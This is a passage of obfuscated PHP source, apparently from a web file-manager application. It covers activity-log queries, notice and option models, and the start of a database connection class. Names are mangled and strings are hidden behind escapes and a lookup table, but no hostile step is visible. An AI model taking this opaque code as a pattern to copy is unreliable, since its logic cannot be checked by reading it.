$Ù±­¨¹ú[7], $Ù±­¨¹ú[2072], array($Ù±­¨¹ú[1990], $Ù±­¨¹ú[495])); $—ËŒ˜Øˆ = $ô¯ıÁÖ®[$—ËŒ˜Øˆ]; $¨ŠâÛôÚ = $¨ŠâÛôÚ . "{$ÊïŞÓªŸ}\40{$—ËŒ˜Øˆ}"; return $this->order($¨ŠâÛôÚ); } public function get($ï‚ˆ©®è = '') { $İ˜€À³š =& $_SERVER[ò«¥Ê‡å]; if (!$ï‚ˆ©®è) { show_json(array()); } $ñîêØØ = array(); if ($ï‚ˆ©®è[$İ˜€À³š[1701]]) { $ñîêØØ[$İ˜€À³š[1701]] = $ï‚ˆ©®è[$İ˜€À³š[1701]]; } if (isset($ï‚ˆ©®è[$İ˜€À³š[799]])) { $¢Õ“´€Ê = $ï‚ˆ©®è[$İ˜€À³š[799]]; $×¨Ó¿Ì = isset($ï‚ˆ©®è[$İ˜€À³š[800]]) ? $ï‚ˆ©®è[$İ˜€À³š[800]] : time(); $ñîêØØ[$İ˜€À³š[217]] = array($İ˜€À³š[379], array($¢Õ“´€Ê, $×¨Ó¿Ì)); } if ($ï‚ˆ©®è[$İ˜€À³š[33]]) { $†¸øÃ¾Å = explode($İ˜€À³š[50], $ï‚ˆ©®è[$İ˜€À³š[33]]); $Ş©ûù ¥ = $this->typeFile(); $âæ·£º“ = array(); foreach ($†¸øÃ¾Å as $¦Ö£“àÆ) { $âæ·£º“[] = $¦Ö£“àÆ; if (isset($Ş©ûù ¥[$¦Ö£“àÆ])) { $âæ·£º“ = array_merge($âæ·£º“, $Ş©ûù ¥[$¦Ö£“àÆ]); } } $âæ·£º“ = array_unique($âæ·£º“); if ($âæ·£º“) { $ñîêØØ[$İ˜€À³š[33]] = array($İ˜€À³š[7], $âæ·£º“); } } else { $ñîêØØ[$İ˜€À³š[33]] = array($İ˜€À³š[2326], $İ˜€À³š[2327]); } if (!empty($ï‚ˆ©®è[$İ˜€À³š[2325]])) { $ñîêØØ[$İ˜€À³š[496]] = array($İ˜€À³š[429], "\x25{$ï‚ˆ©®è[$İ˜€À³š[2325]]}\x25"); } $®ÑÓî¨¸ = $this->_makeOrder()->where($ñîêØØ)->selectPage(); if (empty($®ÑÓî¨¸[$İ˜€À³š[415]])) { show_json(array(), !0, $®ÑÓî¨¸[$İ˜€À³š[412]]); } $®ÑÓî¨¸[$İ˜€À³š[415]] = $this->logList($®ÑÓî¨¸[$İ˜€À³š[415]]); return $®ÑÓî¨¸; } private function ipAddress(&$âİ³—ÄÚ) { $©¦İÉ¨ç =& $_SERVER[ò«¥Ê‡å]; if (!empty($âİ³—ÄÚ[$©¦İÉ¨ç[2325]])) { $õÔæÍÂ = IpLocation::get($âİ³—ÄÚ[$©¦İÉ¨ç[2325]]); } else { $õÔæÍÂ = LNG($©¦İÉ¨ç[2328]); } $âİ³—ÄÚ[$©¦İÉ¨ç[2329]] = $õÔæÍÂ; } private function descZipDownload($éÀêÖÍï, &$öÙŠÔ¶) { $ïæˆııœ =& $_SERVER[ò«¥Ê‡å]; if (!isset($éÀêÖÍï[$ïæˆııœ[2330]])) { return; } $¼¦ëµ¢ì = json_decode($éÀêÖÍï[$ïæˆııœ[2330]], !0); foreach ($¼¦ëµ¢ì as $Úà™äÌ) { try { $œêËûÄÂ = IO::infoFullSimple($Úà™äÌ[$ïæˆııœ[86]]); } catch (Exception $§×û¦¤¶) { continue; } $éÀêÖÍï[$ïæˆııœ[86]] = $Úà™äÌ[$ïæˆııœ[86]]; $öÙŠÔ¶[] = $éÀêÖÍï[$ïæˆııœ[183]] = $œêËûÄÂ[$ïæˆııœ[183]]; $öÙŠÔ¶[] = $éÀêÖÍï[$ïæˆııœ[2128]] = $œêËûÄÂ[$ïæˆııœ[182]]; break; } return $éÀêÖÍï; } private function getSourceList(&$‘™ ¿‡±) { $ìŞúÓ’ =& $_SERVER[ò«¥Ê‡å]; $Î­ÑŒ’İ = array(); foreach ($‘™ ¿‡± as $ªµÁÄ®¥ => $£ïãà‚) { $º²ì±Ö© = json_decode($£ïãà‚[$ìŞúÓ’[496]], !0); if ($£ïãà‚[$ìŞúÓ’[33]] == $ìŞúÓ’[1873]) { $º²ì±Ö© = $this->descZipDownload($º²ì±Ö©, $Î­ÑŒ’İ); $‘™ ¿‡±[$ªµÁÄ®¥][$ìŞúÓ’[496]] = json_encode($º²ì±Ö©); continue; } if (strpos($£ïãà‚[$ìŞúÓ’[33]], $ìŞúÓ’[2130]) !== 0) { if (!isset($º²ì±Ö©[$ìŞúÓ’[86]]) || strpos($£ïãà‚[$ìŞúÓ’[33]], $ìŞúÓ’[2331]) !== 0) { continue; } try { $±”İÏßŞ = IO::infoFullSimple($º²ì±Ö©[$ìŞúÓ’[86]]); } catch (Exception $Å¯ÚÂ°·) { continue; } $Î­ÑŒ’İ[] = $º²ì±Ö©[$ìŞúÓ’[183]] = $±”İÏßŞ[$ìŞúÓ’[183]]; $Î­ÑŒ’İ[] = $º²ì±Ö©[$ìŞúÓ’[2128]] = $±”İÏßŞ[$ìŞúÓ’[182]]; $‘™ ¿‡±[$ªµÁÄ®¥][$ìŞúÓ’[496]] = json_encode($º²ì±Ö©); continue; } $Î­ÑŒ’İ[] = $º²ì±Ö©[$ìŞúÓ’[183]]; $Î­ÑŒ’İ[] = $º²ì±Ö©[$ìŞúÓ’[2128]]; if ($º²ì±Ö©[$ìŞúÓ’[33]] == $ìŞúÓ’[590]) { $Î­ÑŒ’İ[] = $º²ì±Ö©[$ìŞúÓ’[496]][$ìŞúÓ’[1207]]; $Î­ÑŒ’İ[] = $º²ì±Ö©[$ìŞúÓ’[496]][$ìŞúÓ’[1208]]; } if ($º²ì±Ö©[$ìŞúÓ’[33]] == $ìŞúÓ’[2138]) { $Î­ÑŒ’İ[] = $º²ì±Ö©[$ìŞúÓ’[496]][$ìŞúÓ’[183]]; } } if (!$Î­ÑŒ’İ) { return array(); } return Model($ìŞúÓ’[871])->sourceListInfo($Î­ÑŒ’İ, !0); } private function logList($¼ƒ“ÓÄÂ) { $ÓäÙÌ’³ =& $_SERVER[ò«¥Ê‡å]; $çİ¨¤òØ = array_to_keyvalue($¼ƒ“ÓÄÂ, $ÓäÙÌ’³[12], $ÓäÙÌ’³[1701]); $ú½¦š¥¨ = Model($ÓäÙÌ’³[569])->userListInfo(array_unique($çİ¨¤òØ)); $¿Ã‹ú×‡ = $this->getSourceList($¼ƒ“ÓÄÂ); $ùÅ¶ïáÓ = $this->typeAll(); $ë‚”íûİ = array(); $ƒ½øå€Ë = array(); foreach ($¼ƒ“ÓÄÂ as $¸ÖœñÈæ => $€ô­Í–¾) { $‰ô‡º™½ = $€ô­Í–¾[$ÓäÙÌ’³[33]]; $ÓÈã›‡ = isset($ú½¦š¥¨[$€ô­Í–¾[$ÓäÙÌ’³[1701]]]) ? $ú½¦š¥¨[$€ô­Í–¾[$ÓäÙÌ’³[1701]]] : !1; $ğŞšÒ Å = strpos($‰ô‡º™½, $ÓäÙÌ’³[2332]) === 0 ? LNG($ÓäÙÌ’³[2333]) : LNG($ÓäÙÌ’³[2328]); $€ô­Í–¾[$ÓäÙÌ’³[32]] = isset($ÓÈã›‡[$ÓäÙÌ’³[32]]) ? $ÓÈã›‡[$ÓäÙÌ’³[32]] : LNG($ÓäÙÌ’³[2328]); $€ô­Í–¾[$ÓäÙÌ’³[2182]] = isset($ÓÈã›‡[$ÓäÙÌ’³[2182]]) ? $ÓÈã›‡[$ÓäÙÌ’³[2182]] : $ÓäÙÌ’³[12]; $€ô­Í–¾[$ÓäÙÌ’³[1591]] = isset($ùÅ¶ïáÓ[$‰ô‡º™½]) ? $ùÅ¶ïáÓ[$‰ô‡º™½] : $ğŞšÒ Å; $€ô­Í–¾[$ÓäÙÌ’³[2071]] = $ÓÈã›‡; $›ËÁÒİá = json_decode($€ô­Í–¾[$ÓäÙÌ’³[496]], !0); $€ô­Í–¾[$ÓäÙÌ’³[2325]] = isset($›ËÁÒİá[$ÓäÙÌ’³[2325]]) ? $›ËÁÒİá[$ÓäÙÌ’³[2325]] : $ÓäÙÌ’³[12]; $€ô­Í–¾[$ÓäÙÌ’³[2329]] = IpLocation::get($€ô­Í–¾[$ÓäÙÌ’³[2325]]); if (strpos($‰ô‡º™½, $ÓäÙÌ’³[2130]) === 0 || isset($›ËÁÒİá[$ÓäÙÌ’³[2128]])) { $›ËÁÒİá[$ÓäÙÌ’³[89]] = $¿Ã‹ú×‡[$›ËÁÒİá[$ÓäÙÌ’³[183]]]; $›ËÁÒİá[$ÓäÙÌ’³[2143]] = $¿Ã‹ú×‡[$›ËÁÒİá[$ÓäÙÌ’³[2128]]]; if ($›ËÁÒİá[$ÓäÙÌ’³[33]] == $ÓäÙÌ’³[590]) { $›ËÁÒİá[$ÓäÙÌ’³[496]][$ÓäÙÌ’³[1207]] = $¿Ã‹ú×‡[$›ËÁÒİá[$ÓäÙÌ’³[496]][$ÓäÙÌ’³[1207]]]; $›ËÁÒİá[$ÓäÙÌ’³[496]][$ÓäÙÌ’³[1208]] = $¿Ã‹ú×‡[$›ËÁÒİá[$ÓäÙÌ’³[496]][$ÓäÙÌ’³[1208]]]; } if ($›ËÁÒİá[$ÓäÙÌ’³[33]] == $ÓäÙÌ’³[2138]) { $›ËÁÒİá[$ÓäÙÌ’³[496]][$ÓäÙÌ’³[183]] = $¿Ã‹ú×‡[$›ËÁÒİá[$ÓäÙÌ’³[496]][$ÓäÙÌ’³[183]]]; } if ($›ËÁÒİá[$ÓäÙÌ’³[33]] == $ÓäÙÌ’³[1868]) { $›ËÁÒİá[$ÓäÙÌ’³[2143]] = $›ËÁÒİá[$ÓäÙÌ’³[89]]; $›ËÁÒİá[$ÓäÙÌ’³[2128]] = $›ËÁÒİá[$ÓäÙÌ’³[2143]][$ÓäÙÌ’³[183]]; $›ËÁÒİá[$ÓäÙÌ’³[89]] = !1; $›ËÁÒİá[$ÓäÙÌ’³[183]] = $ÓäÙÌ’³[12]; } if ($›ËÁÒİá[$ÓäÙÌ’³[89]] && $›ËÁÒİá[$ÓäÙÌ’³[89]][$ÓäÙÌ’³[180]] == $ÓäÙÌ’³[181]) { $ƒ½øå€Ë[] = $€ô­Í–¾[$ÓäÙÌ’³[445]]; unset($¼ƒ“ÓÄÂ[$¸ÖœñÈæ]); continue; } if ($›ËÁÒİá[$ÓäÙÌ’³[2143]] && $›ËÁÒİá[$ÓäÙÌ’³[2143]][$ÓäÙÌ’³[180]] == $ÓäÙÌ’³[181]) { $ƒ½øå€Ë[] = $€ô­Í–¾[$ÓäÙÌ’³[445]]; unset($¼ƒ“ÓÄÂ[$¸ÖœñÈæ]); continue; } } $€ô­Í–¾[$ÓäÙÌ’³[496]] = $›ËÁÒİá; unset($€ô­Í–¾[$ÓäÙÌ’³[2334]]); $ë‚”íûİ[] = $€ô­Í–¾; } $this->clearSystemPathLog($ƒ½øå€Ë); return $ë‚”íûİ; } private function clearSystemPathLog($¤ÁÍä‰Ô) { $´°™Ñ¿ñ =& $_SERVER[ò«¥Ê‡å]; if (count($¤ÁÍä‰Ô) == 0) { return; } $ù™—Çæ = array($´°™Ñ¿ñ[445] => array($´°™Ñ¿ñ[7], array_unique($¤ÁÍä‰Ô))); $this->where($ù™—Çæ)->delete(); } public function deviceList($Ÿ¥‰ãá, $Úå§ÈÜ = 0) { $¤‰¼Üà =& $_SERVER[ò«¥Ê‡å]; $‚Ö‰êîÕ = array($¤‰¼Üà[1701] => $Ÿ¥‰ãá, $¤‰¼Üà[217] => array($¤‰¼Üà[1061], $Úå§ÈÜ), $¤‰¼Üà[33] => $¤‰¼Üà[1842]); $Õ­††õ = array(); $¹üâò» = $this->field($¤‰¼Üà[2335])->where($‚Ö‰êîÕ)->order($¤‰¼Üà[2141])->limit(50)->select(); foreach ($¹üâò» as $’œ§ò¾• => $ò‡¦“‚×) { if ($’œ§ò¾• > 0 && abs($ò‡¦“‚×[$¤‰¼Üà[217]] - $¹üâò»[$’œ§ò¾• - 1][$¤‰¼Üà[217]]) < 5) { continue; } $Ä³İÓø½ = json_decode($ò‡¦“‚×[$¤‰¼Üà[496]], !0); $ò‡¦“‚×[$¤‰¼Üà[2325]] = isset($Ä³İÓø½[$¤‰¼Üà[2325]]) ? $Ä³İÓø½[$¤‰¼Üà[2325]] : $¤‰¼Üà[12]; unset($Ä³İÓø½[$¤‰¼Üà[2325]]); $‰¹å²êË = $this->deviceType($Ä³İÓø½[$¤‰¼Üà[2131]]); if (isset($Õ­††õ[$‰¹å²êË])) { continue; } $ò‡¦“‚×[$¤‰¼Üà[2329]] = IpLocation::get($ò‡¦“‚×[$¤‰¼Üà[2325]]); $ò‡¦“‚×[$¤‰¼Üà[496]] = $Ä³İÓø½; $Õ­††õ[$‰¹å²êË] = $ò‡¦“‚×; } return array_values($Õ­††õ); } public function deviceType($åùÃÄğ) { return $åùÃÄğ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\x6e\x6f\164\151\143\x65\114\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\143\157\x6e\x74\145\156\164", "\x61\165\164\x68", "\x6d\x6f\x64\x65", "\x74\x69\x6d\145", "\164\x79\x70\145", "\x6c\145\x76\145\x6c", "\x65\156\x61\142\x6c\x65", "\163\157\162\164"); public function listData($”·Ã¶Á± = false, $Î–Òìàç = "\x73\157\162\x74", $ÚÈù² = false) { return parent::listData($”·Ã¶Á±, $Î–Òìàç, $ÚÈù²); } public function add($ìÖ®›Ê») { $À¯µ†½ =& $_SERVER[ò«¥Ê‡å]; $Ì‚±åß• = time(); if ($ìÖ®›Ê»[$À¯µ†½[16]] == $À¯µ†½[2336]) { $Ì‚±åß• = strtotime($ìÖ®›Ê»[$À¯µ†½[196]]); } $ìÖ®›Ê»[$À¯µ†½[196]] = $Ì‚±åß•; return parent::insert($ìÖ®›Ê»); } public function update($’ èîìù, $§¨¼™¯) { $èó‡ =& $_SERVER[ò«¥Ê‡å]; $ˆ©­™×÷ = $this->listData($’ èîìù); if (!$ˆ©­™×÷) { return !1; } $Å¸–ÕÜ = time(); if ($§¨¼™¯[$èó‡[16]] == $èó‡[2336]) { $Å¸–ÕÜ = strtotime($§¨¼™¯[$èó‡[196]]); } $§¨¼™¯[$èó‡[196]] = $Å¸–ÕÜ; return parent::update($’ èîìù, $§¨¼™¯); } public function remove($Æ–‚í­¥) { $ËŠ˜–¥Ÿ = $this->listData($Æ–‚í­¥); if (!$ËŠ˜–¥Ÿ || $ËŠ˜–¥Ÿ[$_SERVER[ò«¥Ê‡å][181]]) { return !1; } return parent::remove($Æ–‚í­¥); } public function sort($Ó±ÎÅ‰, $Öàã†ô†) { return parent::update($Ó±ÎÅ‰, $Öàã†ô†); } public function enable($È–‹¹…ì, $”Ïˆºê¢) { return parent::update($È–‹¹…ì, array($_SERVER[ò«¥Ê‡å][2337] => $”Ïˆºê¢)); } private function initUserOption() { $ËãŠ—ïÅ =& $_SERVER[ò«¥Ê‡å]; $this->optionType = $ËãŠ—ïÅ[2338]; $this->modelType = $ËãŠ—ïÅ[2339]; $this->field = array($ËãŠ—ïÅ[2340], $ËãŠ—ïÅ[32], $ËãŠ—ïÅ[196], $ËãŠ—ïÅ[33], $ËãŠ—ïÅ[2341], $ËãŠ—ïÅ[789], $ËãŠ—ïÅ[212]); } public function userNoticeGet($ëóÁÍ = false) { $this->initUserOption(); return parent::listData($ëóÁÍ, $_SERVER[ò«¥Ê‡å][445], !0); } public function userNoticeAdd($ü˜——µ) { $ÖŒ—ö­Â =& $_SERVER[ò«¥Ê‡å]; $this->initUserOption(); $ÊŠ©‰ûò = $this->findByKey($ÖŒ—ö­Â[2340], $ü˜——µ[$ÖŒ—ö­Â[445]]); if ($ÊŠ©‰ûò) { return !0; } $ÚÆ™’İç = array($ÖŒ—ö­Â[2340] => $ü˜——µ[$ÖŒ—ö­Â[445]], $ÖŒ—ö­Â[32] => $ü˜——µ[$ÖŒ—ö­Â[32]], $ÖŒ—ö­Â[196] => $ü˜——µ[$ÖŒ—ö­Â[196]], $ÖŒ—ö­Â[33] => isset($ü˜——µ[$ÖŒ—ö­Â[33]]) ? $ü˜——µ[$ÖŒ—ö­Â[33]] : 1, $ÖŒ—ö­Â[2341] => isset($ü˜——µ[$ÖŒ—ö­Â[2341]]) ? $ü˜——µ[$ÖŒ—ö­Â[2341]] : 0, $ÖŒ—ö­Â[789] => 0, $ÖŒ—ö­Â[212] => 0); return parent::insert($ÚÆ™’İç); } public function userNoticeEdit($ÉÜúİÆÛ, $ï‰¹ä±å) { $this->initUserOption(); return parent::update($ÉÜúİÆÛ, $ï‰¹ä±å); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\x65\x6d\x5f\x6f\x70\164\151\x6f\156"; protected $jsonField = array("\155\x65\x6e\x75", "\x72\x6f\x6c\145", "\x72\x6f\x6c\145\x47\x72\x6f\x75\x70", "\162\145\147\151\x73\x74", "\145\x6d\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ã¬ƒ£¤ˆ) { return "\123\171\x73\164\145\155\117\160\x74\x69\x6f\156\x5f{$ã¬ƒ£¤ˆ}"; } protected function optionDefault($áÌÍã = '') { $€•õóÜÑ =& $_SERVER[ò«¥Ê‡å]; if ($áÌÍã == $€•õóÜÑ[12]) { return $GLOBALS[$€•õóÜÑ[6]][$€•õóÜÑ[427]]; } } } goto EŠŞ¼òÎ¸º; Fˆğ®•Öğ“: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\x65\x71" => "\74\76", "\147\164" => "\76", "\145\147\x74" => "\76\75", "\154\164" => "\74", "\145\154\x74" => "\x3c\75", "\156\157\x74\x6c\151\153\x65" => "\x4e\117\124\40\114\x49\113\x45", "\154\x69\x6b\145" => "\114\111\x4b\105", "\151\156" => "\111\x4e", "\x6e\x6f\x74\x69\156" => "\116\x4f\124\x20\x49\x4e", "\156\157\164\x20\x69\156" => "\116\x4f\x54\x20\111\116", "\142\x65\x74\x77\x65\145\x6e" => "\102\105\124\x57\x45\x45\x4e", "\x6e\157\x74\x62\145\164\167\145\145\x6e" => "\116\117\x54\x20\102\105\124\x57\x45\105\116", "\156\157\164\x20\x62\x65\164\167\145\x65\x6e" => "\116\117\124\40\102\105\x54\x57\x45\105\116"); protected $selectSql = "\123\105\114\x45\x43\x54\45\104\x49\123\x54\111\x4e\x43\x54\x25\40\45\x46\111\105\x4c\104\45\x20\x46\x52\x4f\115\x20\x25\x54\x41\102\x4c\105\x25\45\x4a\x4f\111\116\x25\x25\127\x48\105\x52\x45\45\45\107\122\x4f\x55\120\45\45\110\x41\x56\111\116\x47\45\45\117\x52\x44\105\122\x25\x25\x4c\111\x4d\111\124\45\x20\45\125\x4e\111\117\116\45\x25\103\x4f\115\115\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $¸·ˆÜà = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ò«¥Ê‡å][1007], $¸·ˆÜà); } public function factory($¼£’Ú«ü = '') { $Ó˜ÖÛÂİ =& $_SERVER[ò«¥Ê‡å]; $¼£’Ú«ü = $this->parseConfig($¼£’Ú«ü); if (empty($¼£’Ú«ü[$Ó˜ÖÛÂİ[1008]])) { think_exception(think_lang($Ó˜ÖÛÂİ[1009])); } $this->dbType = ucwords(strtolower($¼£’Ú«ü[$Ó˜ÖÛÂİ[1008]])); $”ÏÆÉµ = $Ó˜ÖÛÂİ[1010] . $this->dbType; if (class_exists($”ÏÆÉµ)) { $¬…êë = new $”ÏÆÉµ($¼£’Ú«ü); if ($Ó˜ÖÛÂİ[1011] != strtolower($¼£’Ú«ü[$Ó˜ÖÛÂİ[1008]])) { $¬…êë->dbType = strtoupper($this->dbType); } else { $¬…êë->dbType = $this->_getDsnType($¼£’Ú«ü[$Ó˜ÖÛÂİ[963]]); } } else { think_exception(think_lang($Ó˜ÖÛÂİ[1012]) . $Ó˜ÖÛÂİ[1013] . $”ÏÆÉµ); } return $¬…êë; } public function __call($‹·“ÍâØ, $–Üí€ê“) { if (method_exists($this, $‹·“ÍâØ)) { return call_user_func_array(array($this, $‹·“ÍâØ), $–Üí€ê“); } } protected function _getDsnType($Çú‰—œ‡) { $àîØœÚ = explode($_SERVER[ò«¥Ê‡å][4], $Çú‰—œ‡); $ÄÖÜğ£ˆ = strtoupper(trim($àîØœÚ[0])); return $ÄÖÜğ£ˆ; } private function parseConfig($©œ³Ô†¶ = '') { $À¸ÒöÏç =& $_SERVER[ò«¥Ê‡å]; if (!empty($©œ³Ô†¶) && is_string($©œ³Ô†¶)) { $©œ³Ô†¶ = $this->parseDSN($©œ³Ô†¶); } elseif (is_array($©œ³Ô†¶)) { $©œ³Ô†¶ = array_change_key_case($©œ³Ô†¶); $©œ³Ô†¶ = array($À¸ÒöÏç[1008] => $©œ³Ô†¶[$À¸ÒöÏç[1014]], $À¸ÒöÏç[935] => $©œ³Ô†¶[$À¸ÒöÏç[1015]], $À¸ÒöÏç[936] => $©œ³Ô†¶[$À¸ÒöÏç[1016]], $À¸ÒöÏç[933] => $©œ³Ô†¶[$À¸ÒöÏç[1017]], $À¸ÒöÏç[934] => $©œ³Ô†¶[$À¸ÒöÏç[1018]], $À¸ÒöÏç[21] => $©œ³Ô†¶[$À¸ÒöÏç[1019]], $À¸ÒöÏç[963] => $©œ³Ô†¶[$À¸ÒöÏç[1020]], $À¸ÒöÏç[17] => isset($©œ³Ô†¶[$À¸ÒöÏç[1021]]) ? $©œ³Ô†¶[$À¸ÒöÏç[1021]] : array()); } elseif (empty($©œ³Ô†¶)) { if (think_config($À¸ÒöÏç[1022]) && $À¸ÒöÏç[1011] != strtolower(think_config($À¸ÒöÏç[1023]))) { $©œ³Ô†¶ = $this->parseDSN(think_config($À¸ÒöÏç[1022])); } else { $©œ³Ô†¶ = array($À¸ÒöÏç[1008] => think_config($À¸ÒöÏç[1023]), $À¸ÒöÏç[935] => think_config($À¸ÒöÏç[1024]), $À¸ÒöÏç[936] => think_config($À¸ÒöÏç[1025]), $À¸ÒöÏç[933] => think_config($À¸ÒöÏç[1026]), $À¸ÒöÏç[934] => think_config($À¸ÒöÏç[1027]), $À¸ÒöÏç[21] => think_config($À¸ÒöÏç[292]), $À¸ÒöÏç[963] => think_config($À¸ÒöÏç[1022]), $À¸ÒöÏç[17] => think_config($À¸ÒöÏç[1028])); } } return $©œ³Ô†¶; } protected function initConnect($²‚áÚ¿« = true) { if (1 == think_config($_SERVER[ò«¥Ê‡å][22])) { $this->_linkID = $this->multiConnect($²‚áÚ¿«); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Ğø²üäº => $¡“şç–…) { $this->_linkID = $¡“şç–…; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ïğ†÷–µ = false) { $àª¬«ğ  =& $_SERVER[ò«¥Ê‡å]; static $ì÷¤ı´¶ = array(); static $±”·ä§Û = -1; if (empty($ì÷¤ı´¶)) { foreach ($this->config as $ëËÎãŠ† => $ñ˜©¦) { $ì÷¤ı´¶[$ëËÎãŠ†] = explode($àª¬«ğ [50], $ñ˜©¦); } } if (think_config($àª¬«ğ [1029])) { if ($Ïğ†÷–µ || think_config($àª¬«ğ [441]) === !0) { $“İá¤ÒÜ = floor(mt_rand(0, think_config($àª¬«ğ [1030]) - 1)); $±”·ä§Û = $“İá¤ÒÜ; } else { if (is_numeric(think_config($àª¬«ğ [1031]))) { $“İá¤ÒÜ = think_config($àª¬«ğ [1031]); } else { $“İá¤ÒÜ = floor(mt_rand(think_config($àª¬«ğ [1030]), count($ì÷¤ı´¶[$àª¬«ğ [933]]) - 1)); } } } else { $“İá¤ÒÜ = floor(mt_rand(0, count($ì÷¤ı´¶[$àª¬«ğ [933]]) - 1)); $±”·ä§Û = $“İá¤ÒÜ; } $“İá¤ÒÜ = $±”·ä§Û !== -1 ? $±”·ä§Û : $“İá¤ÒÜ; $ŠĞØÚÎÛ = array($àª¬«ğ [935] => isset($ì÷¤ı´¶[$àª¬«ğ [935]][$“İá¤ÒÜ]) ? $ì÷¤ı´¶[$àª¬«ğ [935]][$“İá¤ÒÜ] : $ì÷¤ı´¶[$àª¬«ğ [935]][0], $àª¬«ğ [936] => isset($ì÷¤ı´¶[$àª¬«ğ [936]][$“İá¤ÒÜ]) ? $ì÷¤ı´¶[$àª¬«ğ [936]][$“İá¤ÒÜ] : $ì÷¤ı´¶[$àª¬«ğ [936]][0], $àª¬«ğ [933] => isset($ì÷¤ı´¶[$àª¬«ğ [933]][$“İá¤ÒÜ]) ? $ì÷¤ı´¶[$àª¬«ğ [933]][$“İá¤ÒÜ] : $ì÷¤ı´¶[$àª¬«ğ [933]][0], $àª¬«ğ [934] => isset($ì÷¤ı´¶[$àª¬«ğ [934]][$“İá¤ÒÜ]) ? $ì÷¤ı´¶[$àª¬«ğ [934]][$“İá¤ÒÜ] : $ì÷¤ı´¶[$àª¬«ğ [934]][0], $àª¬«ğ [21] => isset($ì÷¤ı´¶[$àª¬«ğ [21]][$“İá¤ÒÜ]) ? $ì÷¤ı´¶[$àª¬«ğ [21]][$“İá¤ÒÜ] : $ì÷¤ı´¶[$àª¬«ğ [21]][0], $àª¬«ğ [963] => isset($ì÷¤ı´¶[$àª¬«ğ [963]][$“İá¤ÒÜ]) ? $ì÷¤ı´¶[$àª¬«ğ [963]][$“İá¤ÒÜ] : $ì÷¤ı´¶[$àª¬«ğ [963]][0], $àª¬«ğ [17] => isset($ì÷¤ı´¶[$àª¬«ğ [17]][$“İá¤ÒÜ]) ? $ì÷¤ı´¶[$àª¬«ğ [17]][$“İá¤ÒÜ] : $ì÷¤ı´¶[$àª¬«ğ [17]][0]); return $this->connect($ŠĞØÚÎÛ, $“İá¤ÒÜ); } public function parseDSN($‹Æ”»Ñ) { $Ä¬¾€¢ =& $_SERVER[ò«¥Ê‡å]; if (empty($‹Æ”»Ñ)) { return !1; } $ï­†»¯“ = parse_url($‹Æ”»Ñ); if ($ï­†»¯“[$Ä¬¾€¢[197]]) { $‰ö‰šà = array($Ä¬¾€¢[1008] => $ï­†»¯“[$Ä¬¾€¢[197]], $Ä¬¾€¢[935] => isset($ï­†»¯“[$Ä¬¾€¢[632]]) ? $ï­†»¯“[$Ä¬¾€¢[632]] : $Ä¬¾€¢[12], $Ä¬¾€¢[936] => isset($ï­†»¯“[$Ä¬¾€¢[1032]]) ? $ï­†»¯“[$Ä¬¾€¢[1032]] : $Ä¬¾€¢[12], $Ä¬¾€¢[933] => isset($ï­†»¯“[$Ä¬¾€¢[198]]) ? $ï­†»¯“[$Ä¬¾€¢[198]] : $Ä¬¾€¢[12], $Ä¬¾€¢[934] => isset($ï­†»¯“[$Ä¬¾€¢[199]]) ? $ï­†»¯“[$Ä¬¾€¢[199]] : $Ä¬¾€¢[12], $Ä¬¾€¢[21] => isset($ï­†»¯“[$Ä¬¾€¢[86]]) ? substr($ï­†»¯“[$Ä¬¾€¢[86]], 1) : $Ä¬¾€¢[12]); } else { preg_match($Ä¬¾€¢[1033], trim($‹Æ”»Ñ), $ıíİü­); $‰ö‰šà = array($Ä¬¾€¢[1008] => $ıíİü­[1], $Ä¬¾€¢[935] => $ıíİü­[2], $Ä¬¾€¢[936] => $ıíİü­[3], $Ä¬¾€¢[933] => $ıíİü­[4], $Ä¬¾€¢[934] => $ıíİü­[5], $Ä¬¾€¢[21] => $ıíİü­[6]); } $‰ö‰šà[$Ä¬¾€¢[963]] = $Ä¬¾€¢[12]; return $‰ö‰šà; } protected function debug() { $¨´¿Ôİó =& $_SERVER[ò«¥Ê‡å]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¨´¿Ôİó[1034]; if (think_config($¨´¿Ôİó[1035])) { think_status($¨´¿Ôİó[1036]); think_trace($this->queryStr . $¨´¿Ôİó[1037] . think_status($¨´¿Ôİó[24], $¨´¿Ôİó[1036], 6) . $¨´¿Ôİó[1038], $¨´¿Ôİó[12], $¨´¿Ôİó[1039]); } } protected function parseLock($ç§‚ªÁÖ = false) { $†Ğ¥Ü‘½ =& $_SERVER[ò«¥Ê‡å]; if (!$ç§‚ªÁÖ) { return $†Ğ¥Ü‘½[12]; } if ($†Ğ¥Ü‘½[965] == $this->dbType) { return $†Ğ¥Ü‘½[1040]; } return $†Ğ¥Ü‘½[1041]; } protected function parseSet($äüä‰¨’) { $ËË§Ğûµ =& $_SERVER[ò«¥Ê‡å]; foreach ($äüä‰¨’ as $«ÜÌïœÌ => $ÂèÄ¤ü) { if (is_array($ÂèÄ¤ü) && $ËË§Ğûµ[343] == $ÂèÄ¤ü[0]) { $°½ì†ú·[] = $this->parseKey($«ÜÌïœÌ) . $ËË§Ğûµ[931] . $ÂèÄ¤ü[1]; } elseif (is_scalar($ÂèÄ¤ü) || is_null($ÂèÄ¤ü)) { $°½ì†ú·[] = $this->parseKey($«ÜÌïœÌ) . $ËË§Ğûµ[931] . $this->parseValue($ÂèÄ¤ü); } } return $ËË§Ğûµ[1042] . implode($ËË§Ğûµ[50], $°½ì†ú·); } protected function bindParam($ëº™À, $²«êöµâ) { $this->bind[$_SERVER[ò«¥Ê‡å][4] . $ëº™À] = $²«êöµâ; 